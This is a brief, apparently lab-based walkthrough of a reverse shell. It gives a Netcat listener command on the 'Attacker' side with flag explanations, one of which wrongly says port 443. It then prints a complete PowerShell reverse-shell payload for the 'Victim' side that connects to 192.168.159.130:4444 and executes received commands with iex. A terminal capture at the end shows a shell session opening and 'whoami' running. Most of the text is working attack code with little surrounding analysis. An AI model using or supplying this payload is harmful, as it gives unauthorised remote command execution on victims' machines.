Attacker : nc -lvnp 4444
nc: This is the Netcat command.
-l: It makes Netcat listen for incoming connections.
-v: It enables verbose mode, providing more detailed output.
-n: It tells Netcat not to resolve hostnames.
-p 443: It specifies the port number to listen on.

Victim :

$client = New-Object System.Net.Sockets.TCPClient('192.168.159.130', 4444)
$stream = $client.GetStream()
$encoding = [System.Text.Encoding]::UTF8

while ($true) {
    $bytes = New-Object byte[] 4096
    $length = $stream.Read($bytes, 0, $bytes.Length)
    if ($length -le 0) { break }
    
    $data = $encoding.GetString($bytes, 0, $length)
    $sendback = (iex $data 2>&1)
    $sendback += 'PS ' + (Get-Location).Path + '> '
    $sendbackBytes = $encoding.GetBytes($sendback)
    $stream.Write($sendbackBytes, 0, $sendbackBytes.Length)
}

┌─[user@parrot]─[~]
└──╼ $sudo nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.159.1 57984
PS C:\Users\analyst> whoami
desktop-20otd9s\analyst
